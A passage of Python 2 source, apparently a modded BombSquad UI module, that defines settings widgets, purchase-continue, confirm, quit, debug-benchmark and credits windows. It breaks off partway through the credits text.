import bs
import bsInternal
import os
import bsUtils
import random
import bsSpaz
import copy
import bsMap
import math
import bsCoopGame
import time
import bsAchievement
import weakref
import bsServerData
import threading
import bsGame
import filter

#chatfilter ,chat logger , chat command   by mr.smoothy 
#discord @mr.smoothy#5824

  #  https://github.com/imayushsaini/Bombsquad-modded-server-Mr.Smoothy
uiGlobals = {'mainMenuWindow': None}

gWindowStates = {}

gPingErrorReported = False
_g_ping_thread_count = 0

quitWindowID = None

# we include this extra hash with shared input-mapping names
# so that we don't share mappings between differently-configured systems
# for instance, it looks like OUYA gives different keycodes for some gamepads
# than vanilla android will so we want to store their configs distinctly
gInputMapHash = None

gGameTypeSelection = 'Co-op Games'

gTitleColor = (0.72, 0.7, 0.75)
gHeadingColor = (0.72, 0.7, 0.75)
gInfoTextColor = (0.7, 0.9, 0.7)
gDidMenuIntro = False
gIconSelectColor = (0.4, 0.3, 1)

gUntestedGamePads = []
gCanAskToConfigGamePads = True
gShouldAskToMakeProfile = False

env = bs.getEnvironment()
gSmallUI = env['interfaceType'] == 'small'
gMedUI = env['interfaceType'] == 'medium'
gToolbars = env.get('toolbarTest', True)
if env['debugBuild']:
    bsUtils.suppressDebugReports()
del env

# used to be android-specific; now the default.
# Should probably just sub this out everywhere...
gDoAndroidNav = True

# IMPORTANT - if tweaking UI stuff, you need to make sure it behaves for small,
# medium, and large UI-scales. (doesn't run off screen, etc).  Set these to
# 1 to test with different sizes. Generally small is used on phones,
# medium is used on tablets, and large is on desktops or large tablets.

if 0:  # force-test small UI
    gSmallUI = True
    gMedUI = False
    with bs.Context('UI'):
        bs.pushCall(bs.Call(bs.screenMessage,
                            'FORCING SMALL UI FOR TESTING',
                            color=(1, 0, 1), log=True))
if 0:  # force-test medium UI
    gSmallUI = False
    gMedUI = True
    with bs.Context('UI'):
        bs.pushCall(bs.Call(bs.screenMessage,
                            'FORCING MEDIUM UI FOR TESTING',
                            color=(1, 0, 1), log=True))
if 0:  # force-test large UI
    gSmallUI = False
    gMedUI = False
    with bs.Context('UI'):
        bs.pushCall(bs.Call(bs.screenMessage,
                            'FORCING LARGE UI FOR TESTING',
                            color=(1, 0, 1), log=True))

gNamedWindows = True  # temp enable/disable this during testing

_gWindows = {}


def registerWindow(windowClass, name):
    """ Register a window that can then be instantiated by name;
    required for main-menu/overlay navigation """
    print 'WOULD REGISTER', windowClass, 'AS', name
    _gWindows[name] = {'class': windowClass}


def _getPrizeStrings(entry):

    try:
        range1 = entry['prizeRange1']
    except Exception:
        range1 = None
    try:
        range2 = entry['prizeRange2']
    except Exception:
        range2 = None
    try:
        range3 = entry['prizeRange3']
    except Exception:
        range3 = None

    try:
        prize1 = entry['prize1']
    except Exception:
        prize1 = None
    try:
        prize2 = entry['prize2']
    except Exception:
        prize2 = None
    try:
        prize3 = entry['prize3']
    except Exception:
        prize3 = None

    try:
        trophyType1 = entry['prizeTrophy1']
    except Exception:
        trophyType1 = None
    try:
        trophyType2 = entry['prizeTrophy2']
    except Exception:
        trophyType2 = None
    try:
        trophyType3 = entry['prizeTrophy3']
    except Exception:
        trophyType3 = None

    doingTrophies = (True if (trophyType1 is not None
                              or trophyType2 is not None
                              or trophyType3 is not None) else False)

    outVals = []

    for rng, prize, trophyType in ((range1, prize1, trophyType1),
                                   (range2, prize2, trophyType2),
                                   (range3, prize3, trophyType3)):
        pr = ('' if rng is None
              else ('#'+str(rng[0])) if (rng[0] == rng[1])
              else ('#'+str(rng[0])+'-'+str(rng[1])))
        pv = ''
        if trophyType is not None:
            pv += bs.getSpecialChar('trophy'+str(trophyType))
        # if we've got trophies but not for this entry, throw some space
        # in to compensate so the ticket counts line up
        if prize is not None:
            pv = bs.getSpecialChar('ticketBacking')+str(prize)+pv
        outVals.append(pr)
        outVals.append(pv)
    return outVals


def getInputMapHash(inputDevice):
    global gInputMapHash
    # currently we just do a single hash of *all* inputs on android
    # and thats it.. good enough.
    # (grabbing mappings for a specific device looks to be non-trivial)
    try:
        if gInputMapHash is None:
            if 'android' in bs.getEnvironment()['userAgentString']:
                import hashlib
                md5 = hashlib.md5()
                for d in ['/system/usr/keylayout',
                          '/data/usr/keylayout',
                          '/data/system/devices/keylayout']:
                    try:
                        if os.path.isdir(d):
                            for fName in os.listdir(d):
                                # this is usually volume keys and stuff;
                                # assume we can skip it?..
                                # (since it'll vary a lot across devices)
                                if fName == 'gpio-keys.kl':
                                    continue
                                f = open(d+'/'+fName)
                                md5.update(f.read())
                                f.close()
                    except Exception:
                        bs.printException('error in getInputMapHash inner loop')
                gInputMapHash = md5.hexdigest()
            else:
                gInputMapHash = ''
        return gInputMapHash
    except Exception:
        bs.printException('Exception in getInputMapHash')
        return ''


def dismissWiiRemotesWindow():
    pass


def _configChanged(val):
    bs.writeConfig()
    bs.applySettings()


def configCheckBox(parent, name, position, size, displayName=None, scale=None,
                   maxWidth=None, autoSelect=True, valueChangeCall=None):
    'Create a checkbox widget linked to a value in the bs config'
    if displayName is None:
        displayName = name

    def _valueChanged(val):
        bs.getConfig()[name] = val
        if valueChangeCall is not None:
            valueChangeCall(val)
        bs.applySettings()
        bs.writeConfig()

    return bs.checkBoxWidget(parent=parent, autoSelect=autoSelect,
                             position=position, size=size, text=displayName,
                             textColor=(0.8, 0.8, 0.8),
                             value=bsInternal._getSetting(name),
                             onValueChangeCall=_valueChanged, scale=scale,
                             maxWidth=maxWidth)


def _inc(ctrl, name, minVal, maxVal, increment, callback):
    val = float(bs.textWidget(query=ctrl))
    val += increment
    val = max(minVal, min(val, maxVal))
    bs.textWidget(edit=ctrl, text=str(round(val, 2)))
    bs.getConfig()[name] = val
    if callback:
        callback(val)
    _configChanged(val)


def configTextBox(parent, name, position, type="string", minVal=0, maxVal=100,
                  increment=1.0, callback=None, changeSound=True, xOffset=0,
                  displayName=None, textScale=1.0):

    if displayName is None:
        displayName = name
    if type == "int":
        initStr = "str(int(bsInternal._getSetting(" + repr(name) + ")))"
    elif type == "float":
        initStr = "str(round(bsInternal._getSetting(" + repr(name) + "),2))"
    else:
        initStr = "str(bsInternal._getSetting(" + repr(name) + "))"
    t = bs.textWidget(parent=parent, position=position, size=(100, 30),
                      text=displayName, maxWidth=160+xOffset,
                      color=(0.8, 0.8, 0.8, 1.0), hAlign="left",
                      vAlign="center", scale=textScale)
    retVals = {}
    if type == 'string':
        raise Exception("fixme unimplemented")
    else:
        retVals['textWidget'] = t = bs.textWidget(
            parent=parent, position=(246+xOffset, position[1]), size=(60, 28),
            editable=False, color=(0.3, 1.0, 0.3, 1.0), hAlign="right",
            vAlign="center", text=eval(initStr), padding=2)
        retVals['minusButton'] = b = bs.buttonWidget(
            parent=parent, position=(330+xOffset, position[1]), size=(28, 28),
            label="-", autoSelect=True,
            onActivateCall=bs.Call(
                _inc, t, name, minVal, maxVal, -increment, callback),
            repeat=True, enableSound=(changeSound is True))
        retVals['plusButton'] = b = bs.buttonWidget(
            parent=parent, position=(380+xOffset, position[1]), size=(28, 28),
            label="+", autoSelect=True,
            onActivateCall=bs.Call(
                _inc, t, name, minVal, maxVal, increment, callback),
            repeat=True, enableSound=(changeSound is True))
    return retVals


def _makeRadioGroup(checkBoxes, valueNames, value, valueChangeCall):
    """ link the provided checkBoxes together into a radio group """
    def _radioPress(checkString, otherCheckBoxes, value):
        if value == 1:
            valueChangeCall(checkString)
            for cb in otherCheckBoxes:
                bs.checkBoxWidget(edit=cb, value=0)
    for i, checkBox in enumerate(checkBoxes):
        bs.checkBoxWidget(
            edit=checkBox, value=(value == valueNames[i]), isRadioButton=True,
            onValueChangeCall=bs.Call(_radioPress, valueNames[i],
                                      [c for c in checkBoxes if c != checkBox]))


class Window(object):
    def getRootWidget(self):
        return self._rootWidget


class ContinueWindow(Window):

    def __init__(self, activity, cost, continueCall, cancelCall):
        self._activity = weakref.ref(activity)
        self._cost = cost
        self._continueCall = continueCall
        self._cancelCall = cancelCall
        self._startCount = self._count = 20
        self._width = 300
        self._height = 200
        self._transitioningOut = False
        self._rootWidget = bs.containerWidget(size=(self._width, self._height),
                                              background=False,
                                              toolbarVisibility='MENU_CURRENCY',
                                              transition='inScale', scale=1.5)
        t = (bs.Lstr(resource='continuePurchaseText')
             .evaluate().split('${PRICE}'))
        tLeft = t[0]
        tLeftWidth = bsInternal._getStringWidth(tLeft, suppressWarning=True)
        tPrice = bs.getSpecialChar('ticket')+str(self._cost)
        tPriceWidth = bsInternal._getStringWidth(tPrice, suppressWarning=True)
        tRight = t[-1]
        tRightWidth = bsInternal._getStringWidth(tRight, suppressWarning=True)
        widthTotalHalf = (tLeftWidth+tPriceWidth+tRightWidth)*0.5

        bs.textWidget(
            parent=self._rootWidget, text=tLeft, flatness=1.0,
            shadow=1.0, size=(0, 0), hAlign='left', vAlign='center',
            position=(self._width*0.5-widthTotalHalf, self._height-30))
        bs.textWidget(
            parent=self._rootWidget, text=tPrice, flatness=1.0,
            shadow=1.0, color=(0.2, 1.0, 0.2), size=(0, 0),
            position=(self._width*0.5-widthTotalHalf+tLeftWidth,
                      self._height-30), hAlign='left', vAlign='center')
        bs.textWidget(
            parent=self._rootWidget, text=tRight, flatness=1.0, shadow=1.0,
            size=(0, 0), hAlign='left', vAlign='center',
            position=(self._width*0.5-widthTotalHalf+tLeftWidth+tPriceWidth+5,
                      self._height-30))

        if not gToolbars:
            self._ticketsTextBase = bs.Lstr(
                resource='getTicketsWindow.youHaveShortText',
                fallbackResource='getTicketsWindow.youHaveText').evaluate()
            self._ticketsText = bs.textWidget(
                parent=self._rootWidget, text='', flatness=1.0,
                color=(0.2, 1.0, 0.2), shadow=1.0,
                position=(self._width*0.5+widthTotalHalf, self._height-50),
                size=(0, 0), scale=0.35, hAlign='right', vAlign='center')
        else:
            self._ticketsTextBase = None
            self._ticketsText = None

        self._counterText = bs.textWidget(
            parent=self._rootWidget, text=str(self._count),
            color=(0.7, 0.7, 0.7), scale=1.2, size=(0, 0), big=True,
            position=(self._width*0.5, self._height-80),
            flatness=1.0, shadow=1.0, hAlign='center', vAlign='center')
        self._cancelButton = bs.buttonWidget(
            parent=self._rootWidget, position=(30, 30), size=(120, 50),
            label=bs.Lstr(resource='endText', fallbackResource='cancelText'),
            autoSelect=True, enableSound=False,
            onActivateCall=self._onCancelPress)
        self._continueButton = bs.buttonWidget(
            parent=self._rootWidget, label=bs.Lstr(resource='continueText'),
            autoSelect=True, position=(self._width-130, 30), size=(120, 50),
            onActivateCall=self._onContinuePress)
        bs.containerWidget(
            edit=self._rootWidget, cancelButton=self._cancelButton,
            startButton=self._continueButton, selectedChild=self._cancelButton)

        self._countingDown = True
        self._countdownTimer = bs.Timer(1000, bs.WeakCall(self._tick),
                                        repeat=True, timeType='real')
        self._tick()

    def _tick(self):
        # if our target activity is gone or has ended, go away
        a = self._activity()
        if a is None or a.hasEnded():
            self._onCancel()
            return

        if bsInternal._getAccountState() == 'SIGNED_IN':
            s = (bs.getSpecialChar('ticket')
                 + str(bsInternal._getAccountTicketCount()))
        else:
            s = '?'
        if self._ticketsText is not None:
            bs.textWidget(edit=self._ticketsText,
                          text=self._ticketsTextBase.replace('${COUNT}', s))

        if self._countingDown:
            self._count -= 1
            bs.playSound(bs.getSound('tick'))
            if self._count <= 0:
                self._onCancel()
            else:
                bs.textWidget(edit=self._counterText, text=str(self._count))

    def _onCancelPress(self):
        # disallow for first second
        if self._startCount-self._count < 2:
            bs.playSound(bs.getSound('error'))
        else:
            self._onCancel()

    def _onContinuePress(self):
        # disallow for first second
        if self._startCount-self._count < 2:
            bs.playSound(bs.getSound('error'))
        else:
            # if somehow we got signed out...
            if bsInternal._getAccountState() != 'SIGNED_IN':
                bs.screenMessage(bs.Lstr(resource='notSignedInText'),
                                 color=(1, 0, 0))
                bs.playSound(bs.getSound('error'))
                return

            # if it appears we don't have enough tickets, offer to buy more
            tickets = bsInternal._getAccountTicketCount()
            if tickets < self._cost:
                # FIXME - should we start the timer back up again after?..
                self._countingDown = False
                bs.textWidget(edit=self._counterText, text='')
                bs.playSound(bs.getSound('error'))
                showGetTicketsPrompt()
                return
            if not self._transitioningOut:
                bs.playSound(bs.getSound('swish'))
                self._transitioningOut = True
                bs.containerWidget(edit=self._rootWidget, transition='outScale')
                self._continueCall()

    def _onCancel(self):
        if not self._transitioningOut:
            bs.playSound(bs.getSound('swish'))
            self._transitioningOut = True
            bs.containerWidget(edit=self._rootWidget, transition='outScale')
            self._cancelCall()


class ConfirmWindow(Window):

    def __init__(self, text="Are you sure?", action=None, width=360,
                 height=100, cancelButton=True, cancelIsSelected=False,
                 color=(1, 1, 1), textScale=1.0, okText=None, cancelText=None,
                 originWidget=None):
        if okText is None:
            okText = bs.Lstr(resource='okText')
        if cancelText is None:
            cancelText = bs.Lstr(resource='cancelText')
        height += 40
        if width < 360:
            width = 360
        self._action = action

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = None
            scaleOrigin = None
            transition = 'inRight'

        self._rootWidget = bs.containerWidget(
            size=(width, height), transition=transition,
            toolbarVisibility='MENU_MINIMAL_NOBACK',
            parent=bsInternal._getSpecialWidget('overlayStack'),
            scale=2.1 if gSmallUI else 1.5 if gMedUI else 1.0,
            scaleOriginStackOffset=scaleOrigin)

        t = bs.textWidget(parent=self._rootWidget,
                          position=(width*0.5, height-5-(height-75)*0.5),
                          size=(0, 0), hAlign="center", vAlign="center",
                          text=text, scale=textScale, color=color,
                          maxWidth=width*0.9, maxHeight=height-75)
        if cancelButton:
            cb = b = bs.buttonWidget(parent=self._rootWidget, autoSelect=True,
                                     position=(20, 20), size=(150, 50),
                                     label=cancelText,
                                     onActivateCall=self._cancel)
            bs.containerWidget(edit=self._rootWidget, cancelButton=b)
            okButtonH = width-175
        else:
            # if they dont want a cancel button, we still want back presses to
            # be able to dismiss the window; just wire it up to do the ok button
            okButtonH = width*0.5-75
            cb = None
        b = bs.buttonWidget(parent=self._rootWidget, autoSelect=True,
                            position=(okButtonH, 20), size=(150, 50),
                            label=okText, onActivateCall=self._ok)

        # if they didnt want a cancel button, we still want to be able to hit
        # cancel/back/etc to dismiss the window
        if not cancelButton:
            bs.containerWidget(edit=self._rootWidget, onCancelCall=b.activate)

        bs.containerWidget(edit=self._rootWidget,
                           selectedChild=(cb if cb is not None
                                          and cancelIsSelected else b),
                           startButton=b)

    def _cancel(self):
        bs.containerWidget(edit=self._rootWidget,
                           transition=('outRight' if self._transitionOut is None
                                       else self._transitionOut))

    def _ok(self):
        if not self._rootWidget.exists():
            return
        bs.containerWidget(edit=self._rootWidget,
                           transition=('outLeft' if self._transitionOut is None
                                       else self._transitionOut))
        if self._action is not None:
            self._action()


class QuitWindow(Window):

    def __init__(self, swish=False, back=False, originWidget=None):
        global quitWindowID
        self._back = back
        if quitWindowID is not None:
            quitWindowID.delete()
            quitWindowID = None
        if swish:
            bs.playSound(bs.getSound('swish'))
        env = bs.getEnvironment()
        quitResource = ('quitGameText' if env['platform'] == 'mac'
                        else 'exitGameText')
        self._rootWidget = quitWindowID = ConfirmWindow(
            bs.Lstr(resource=quitResource,
                    subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]),
            self._doFadeAndQuit, originWidget=originWidget).getRootWidget()

    def _doFadeAndQuit(self):
        bsInternal._fadeScreen(False, time=200, endCall=bs.Call(
            bs.quit, soft=True, back=self._back))
        bsInternal._lockAllInput()
        # unlock and fade back in shortly.. just in case something goes wrong
        # (or on android where quit just backs out of our activity and
        # we may come back)
        bs.realTimer(300, bsInternal._unlockAllInput)


class DebugWindow(Window):

    def __init__(self, transition='inRight'):

        self._width = width = 580
        self._height = height = 350 if gSmallUI else 420 if gMedUI else 520

        self._scrollWidth = self._width - 100
        self._scrollHeight = self._height - 120

        self._subWidth = self._scrollWidth*0.95
        self._subHeight = 520

        self._stressTestGameType = 'Random'
        self._stressTestPlaylist = '__default__'
        self._stressTestPlayerCount = 8
        self._stressTestRoundDuration = 30

        self._r = 'debugWindow'
        self._rootWidget = bs.containerWidget(
            size=(width, height), transition=transition,
            scale=2.35 if gSmallUI else 1.55 if gMedUI else 1.0,
            stackOffset=(0, -30) if gSmallUI else (0, 0))

        self._doneButton = b = bs.buttonWidget(
            parent=self._rootWidget, position=(40, height-67), size=(120, 60),
            scale=0.8, autoSelect=True, label=bs.Lstr(resource='doneText'),
            onActivateCall=self._done)
        bs.containerWidget(edit=self._rootWidget, cancelButton=b)
        t = bs.textWidget(parent=self._rootWidget, position=(0, height-60),
                          size=(width, 30),
                          text=bs.Lstr(resource=self._r+'.titleText'),
                          hAlign="center", color=gTitleColor,
                          vAlign="center", maxWidth=260)

        self._scrollWidget = bs.scrollWidget(
            parent=self._rootWidget, highlight=False,
            size=(self._scrollWidth, self._scrollHeight),
            position=((self._width-self._scrollWidth)*0.5, 50))
        bs.containerWidget(edit=self._scrollWidget, claimsLeftRight=True)

        self._subContainer = bs.containerWidget(
            parent=self._scrollWidget, size=(self._subWidth, self._subHeight),
            background=False)

        v = self._subHeight - 70
        buttonWidth = 300
        b = bs.buttonWidget(
            parent=self._subContainer,
            position=((self._subWidth-buttonWidth)*0.5, v),
            size=(buttonWidth, 60), autoSelect=True,
            label=bs.Lstr(resource=self._r+'.runCPUBenchmarkText'),
            onActivateCall=self._runCPUBenchmarkPressed)
        bs.widget(edit=b, upWidget=self._doneButton,
                  leftWidget=self._doneButton)
        v -= 60

        b = bs.buttonWidget(
            parent=self._subContainer,
            position=((self._subWidth - buttonWidth) * 0.5, v),
            size=(buttonWidth, 60),
            autoSelect=True, label=bs.Lstr(
                resource=self._r + '.runGPUBenchmarkText'),
            onActivateCall=self._runGPUBenchmarkPressed)
        v -= 60

        b = bs.buttonWidget(
            parent=self._subContainer,
            position=((self._subWidth - buttonWidth) * 0.5, v),
            size=(buttonWidth, 60),
            autoSelect=True, label=bs.Lstr(
                resource=self._r + '.runMediaReloadBenchmarkText'),
            onActivateCall=self._runMediaReloadBenchmarkPressed)
        v -= 60

        t = bs.textWidget(parent=self._subContainer,
                          position=(self._subWidth * 0.5, v + 22),
                          size=(0, 0),
                          text=bs.Lstr(
                              resource=self._r + '.stressTestTitleText'),
                          maxWidth=200, color=gHeadingColor, scale=0.85,
                          hAlign="center", vAlign="center")
        v -= 45

        xOffs = 165
        t = bs.textWidget(
            parent=self._subContainer, position=(xOffs - 10, v + 22),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.stressTestPlaylistTypeText'),
            maxWidth=130, color=gHeadingColor, scale=0.65, hAlign="right",
            vAlign="center")

        PopupMenu(
            parent=self._subContainer, position=(xOffs, v),
            width=150, choices=['Random', 'Teams', 'Free-For-All'],
            choicesDisplay=[bs.Lstr(resource=a)
                            for a
                            in
                            ['randomText', 'playModes.teamsText',
                             'playModes.freeForAllText']],
            currentChoice='Auto',
            onValueChangeCall=self._stressTestGameTypeSelected)
        v -= 46
        t = bs.textWidget(
            parent=self._subContainer, position=(xOffs - 10, v + 22),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.stressTestPlaylistNameText'),
            maxWidth=130, color=gHeadingColor, scale=0.65, hAlign="right",
            vAlign="center")
        self._stressTestPlaylistNameField = bs.textWidget(
            parent=self._subContainer, position=(xOffs + 5, v - 5),
            size=(250, 46),
            text=self._stressTestPlaylist, hAlign="left", vAlign="center",
            autoSelect=True, color=(0.9, 0.9, 0.9, 1.0),
            description=bs.Lstr(
                resource=self._r + '.stressTestPlaylistDescriptionText'),
            editable=True, padding=4)
        v -= 29
        xSub = 60

        # player count
        t = bs.textWidget(
            parent=self._subContainer, position=(xOffs - 10, v),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.stressTestPlayerCountText'),
            color=(0.8, 0.8, 0.8, 1.0),
            hAlign="right", vAlign="center", scale=0.65, maxWidth=130)
        self._stressTestPlayerCountText = bs.textWidget(
            parent=self._subContainer, position=(246 - xSub, v - 14),
            size=(60, 28),
            editable=False, color=(0.3, 1.0, 0.3, 1.0),
            hAlign="right", vAlign="center",
            text=str(self._stressTestPlayerCount),
            padding=2)
        b = bs.buttonWidget(
            parent=self._subContainer, position=(330 - xSub, v - 11),
            size=(28, 28),
            label="-", autoSelect=True, onActivateCall=bs.Call(
                self._stressTestPlayerCountDecrement),
            repeat=True, enableSound=True)
        b = bs.buttonWidget(
            parent=self._subContainer, position=(380 - xSub, v - 11),
            size=(28, 28),
            label="+", autoSelect=True, onActivateCall=bs.Call(
                self._stressTestPlayerCountIncrement),
            repeat=True, enableSound=True)
        v -= 42

        # round duration
        t = bs.textWidget(
            parent=self._subContainer, position=(xOffs - 10, v),
            size=(0, 0),
            text=bs.Lstr(resource=self._r + '.stressTestRoundDurationText'),
            color=(0.8, 0.8, 0.8, 1.0),
            hAlign="right", vAlign="center", scale=0.65, maxWidth=130)
        self._stressTestRoundDurationText = bs.textWidget(
            parent=self._subContainer, position=(246 - xSub, v - 14),
            size=(60, 28),
            editable=False, color=(0.3, 1.0, 0.3, 1.0),
            hAlign="right", vAlign="center",
            text=str(self._stressTestRoundDuration),
            padding=2)
        b = bs.buttonWidget(
            parent=self._subContainer, position=(330 - xSub, v - 11),
            size=(28, 28),
            label="-", autoSelect=True, onActivateCall=bs.Call(
                self._stressTestRoundDurationDecrement),
            repeat=True, enableSound=True)
        b = bs.buttonWidget(
            parent=self._subContainer, position=(380 - xSub, v - 11),
            size=(28, 28),
            label="+", autoSelect=True, onActivateCall=bs.Call(
                self._stressTestRoundDurationIncrement),
            repeat=True, enableSound=True)
        v -= 82
        b = bs.buttonWidget(
            parent=self._subContainer,
            position=((self._subWidth - buttonWidth) * 0.5, v),
            size=(buttonWidth, 60),
            autoSelect=True, label=bs.Lstr(
                resource=self._r + '.runStressTestText'),
            onActivateCall=self._stressTestPressed)
        bs.widget(b, showBufferBottom=50)

    def _stressTestPlayerCountDecrement(self):
        self._stressTestPlayerCount = max(1, self._stressTestPlayerCount - 1)
        bs.textWidget(edit=self._stressTestPlayerCountText,
                      text=str(self._stressTestPlayerCount))

    def _stressTestPlayerCountIncrement(self):
        self._stressTestPlayerCount = self._stressTestPlayerCount + 1
        bs.textWidget(edit=self._stressTestPlayerCountText,
                      text=str(self._stressTestPlayerCount))

    def _stressTestRoundDurationDecrement(self):
        self._stressTestRoundDuration = max(
            10, self._stressTestRoundDuration - 10)
        bs.textWidget(edit=self._stressTestRoundDurationText,
                      text=str(self._stressTestRoundDuration))

    def _stressTestRoundDurationIncrement(self):
        self._stressTestRoundDuration = self._stressTestRoundDuration + 10
        bs.textWidget(edit=self._stressTestRoundDurationText,
                      text=str(self._stressTestRoundDuration))

    def _stressTestGameTypeSelected(self, gameType):
        self._stressTestGameType = gameType

    def _runCPUBenchmarkPressed(self):
        bsUtils.runCPUBenchmark()

    def _runGPUBenchmarkPressed(self):
        bsUtils.runGPUBenchmark()

    def _runMediaReloadBenchmarkPressed(self):
        bsUtils.runMediaReloadBenchmark()

    def _stressTestPressed(self):
        bsUtils.runStressTest(
            playlistType=self._stressTestGameType, playlistName=bs.textWidget(
                query=self._stressTestPlaylistNameField),
            playerCount=self._stressTestPlayerCount,
            roundDuration=self._stressTestRoundDuration)
        bs.containerWidget(edit=self._rootWidget, transition='outRight')

    def _done(self):
        bs.containerWidget(edit=self._rootWidget, transition='outRight')
        uiGlobals['mainMenuWindow'] = AdvancedSettingsWindow(
            transition='inLeft').getRootWidget()


class CreditsWindow(Window):
    def __init__(self, originWidget=None):

        bsInternal._setAnalyticsScreen('Credits Window')

        # if they provided an origin-widget, scale up from that
        if originWidget is not None:
            self._transitionOut = 'outScale'
            scaleOrigin = originWidget.getScreenSpaceCenter()
            transition = 'inScale'
        else:
            self._transitionOut = 'outRight'
            scaleOrigin = None
            transition = 'inRight'

        width = 870 if gSmallUI else 670
        xInset = 100 if gSmallUI else 0
        height = 398 if gSmallUI else 500

        self._r = 'creditsWindow'
        self._rootWidget = bs.containerWidget(
            size=(width, height),
            transition=transition, toolbarVisibility='MENU_MINIMAL',
            scaleOriginStackOffset=scaleOrigin, scale=2.0
            if gSmallUI else 1.3 if gMedUI else 1.0, stackOffset=(0, -8)
            if gSmallUI else(0, 0))

        if gToolbars and gSmallUI:
            bs.containerWidget(edit=self._rootWidget, onCancelCall=self._back)
        else:
            b = bs.buttonWidget(
                parent=self._rootWidget,
                position=(40 + xInset, height - (68 if gSmallUI else 62)),
                size=(140, 60),
                scale=0.8, label=bs.Lstr(resource='backText'),
                buttonType='back', onActivateCall=self._back, autoSelect=True)
            bs.containerWidget(edit=self._rootWidget, cancelButton=b)

            if gDoAndroidNav:
                bs.buttonWidget(
                    edit=b, buttonType='backSmall',
                    position=(40 + xInset, height - (68 if gSmallUI else 62) + 5),
                    size=(60, 48),
                    label=bs.getSpecialChar('back'))

        t = bs.textWidget(
            parent=self._rootWidget,
            position=(0, height - (59 if gSmallUI else 54)),
            size=(width, 30),
            text=bs.Lstr(
                resource=self._r + '.titleText',
                subs=[('${APP_NAME}', bs.Lstr(resource='titleText'))]),
            hAlign="center", color=gTitleColor, maxWidth=330, vAlign="center")

        s = bs.scrollWidget(parent=self._rootWidget, position=(
            40+xInset, 35), size=(width-(80+2*xInset), height-100),
                            captureArrows=True)

        if gToolbars:
            bs.widget(edit=s, rightWidget=bsInternal._getSpecialWidget(
                'partyButton'))
            if gSmallUI:
                bs.widget(
                    edit=s, leftWidget=bsInternal._getSpecialWidget(
                        'backButton'))

        def _formatNames(names, inset):
            s = ''
            # measure a series since theres overlaps and stuff..
            spaceWidth = bsInternal._getStringWidth(
                ' ' * 10, suppressWarning=True) / 10.0
            spacing = 330
            c1 = inset
            c2 = c1+spacing
            c3 = c2+spacing
            lineWidth = 0
            line = ''
            for name in names:
                # move to the next column (or row) and print
                if lineWidth > c3:
                    s += line+'\n'
                    line = ''
                    lineWidth = 0

                if lineWidth > c2:
                    target = c3
                elif lineWidth > c1:
                    target = c2
                else:
                    target = c1
                spacing = ' '*int((target-lineWidth)/spaceWidth)
                line += spacing
                line += name.decode('utf-8')
                lineWidth = bsInternal._getStringWidth(
                    line, suppressWarning=True)
            if line != '':
                s += line+'\n'
            return s

        soundAndMusic = bs.Lstr(resource=self._r+'.songCreditText').evaluate()
        soundAndMusic = soundAndMusic.replace(
            '${TITLE}', "'William Tell (Trumpet Entry)'")
        soundAndMusic = soundAndMusic.replace(
            '${PERFORMER}', 'The Apollo Symphony Orchestra')
        soundAndMusic = soundAndMusic.replace(
            '${PERFORMER}', 'The Apollo Symphony Orchestra')
        soundAndMusic = soundAndMusic.replace(
            '${COMPOSER}', 'Gioacchino Rossini')
        soundAndMusic = soundAndMusic.replace('${ARRANGER}', 'Chris Worth')
        soundAndMusic = soundAndMusic.replace('${PUBLISHER}', 'BMI')
        soundAndMusic = soundAndMusic.replace('${SOURCE}', 'www.AudioSparx.com')
        spc = '     '
        soundAndMusic = spc+soundAndMusic.replace('\n', '\n'+spc)
        names = [
            'HubOfTheUniverseProd', 'Jovica', 'LG', 'Leady', 'Percy Duke',
            'PhreaKsAccount', 'Pogotron', 'Rock Savage', 'anamorphosis',
            'benboncan', 'cdrk', 'chipfork', 'guitarguy1985', 'jascha',
            'joedeshon', 'loofa', 'm_O_m', 'mich3d', 'sandyrb', 'shakaharu',
            'sirplus', 'stickman', 'thanvannispen', 'virotic', 'zimbot']
        names.sort(key=lambda x: x.lower())

        freesoundNames = _formatNames(names, 90)

        translationNames = _formatNames(
            bsServerData.translationContributors, 60)
        # Need to chop this up since we're passing our 65535 vertex
        # limit for meshes..
        # We can remove that limit once we drop support for GL ES2.. :-/
        creditsText = (
            '  '+bs.Lstr(resource=self._r+'.codingGraphicsAudioText')
            .evaluate().replace('${NAME}', 'Eric Froemling')+'\n'
            '\n'
            '  '+bs.Lstr(resource=self._r+'.additionalAudioArtIdeasText')
            .evaluate().replace('${NAME}', 'Raphael Suter')+'\n'
            '\n'
            '  '+bs.Lstr(resource=self._r+'.soundAndMusicText').evaluate()+'\n'
            '\n'
            + soundAndMusic+'\n'
            '\n'
            '     '+bs.Lstr(resource=self._r+'.publicDomainMusicViaText')
            .evaluate().replace('${NAME}', 'Musopen.com')+'\n'
            '        '+bs.Lstr(resource=self._r+'.thanksEspeciallyToText')
            .evaluate().replace('${NAME}',
                                'the US Army, Navy, and Marine Bands')+'\n'
            '\n'
            '     '+bs.Lstr(resource=self._r+'.additionalMusicFromText')
            .evaluate().replace('${NAME}', 'The YouTube Audio Library')+'\n'
            '\n'
            '     '+bs.Lstr(resource=self._r+'.soundsText').evaluate()
            .replace('${SOURCE}', 'Freesound.org')+'\n'
            '\n'
            + freesoundNames+'\n'
            '\n'
            '  '+bs.Lstr(resource=self._r+'.languageTranslationsText')
            .evaluate()+'\n'
            '\n'
            + '\n'.join(translationNames.splitlines()[:146]) +
            '\n'.join(translationNames.splitlines()[146:])+'\n'
            '\n'
            '  Shout Out to Awesome Mods / Modders:\n\n'
            '     BombDash ModPack\n'
            '     TheMikirog & SoK - BombSquad Joyride Modpack\n'
            '     Mrmaxmeier - BombSquad-Community-Mod-Manager\n'
            '\n'
            '  Holiday theme vector art designed by Freepik\n'
            '\n'
            '  '+bs.Lstr(resource=self._r+'.specialThanksText').evaluate()+'\n'
            '\n'
            '     Todd, Laura, and Robert Froemling\n'
            '     '+bs.Lstr(resource=self._r+'.allMyFamilyText')
            .evaluate().replace('\n', '\n     ')+'\n'
            '     '+bs.Lstr(resource=self._r+'.whoeverInventedCoffeeText')
            .evaluate()+'\n'
            '\n'
            '  '+bs.Lstr(resource=self._r+'.legalText').evaluate()+'\n'
            '\n'
            '     '+bs.Lstr(resource=self._r+'.softwareBasedOnText')
